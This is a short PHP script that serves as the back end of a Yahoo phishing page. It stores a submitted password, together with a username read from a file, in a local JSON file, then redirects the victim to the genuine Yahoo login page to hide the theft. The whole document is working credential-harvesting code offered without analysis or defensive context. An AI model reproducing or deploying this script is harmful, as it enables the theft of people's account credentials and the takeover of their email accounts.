<?php
$pass = $_POST['password'];
$u=fopen('user.json','r');
$user=fread($u,filesize('user.json'));
$data['dev'][] = array('username' =>$user,
'password'=>$pass);
$jdata = json_encode($data);    
$f = fopen('usernames.json', 'w');
fwrite($f, $jdata);
fclose($f); 
header("location:https://login.yahoo.com");
exit();
?>
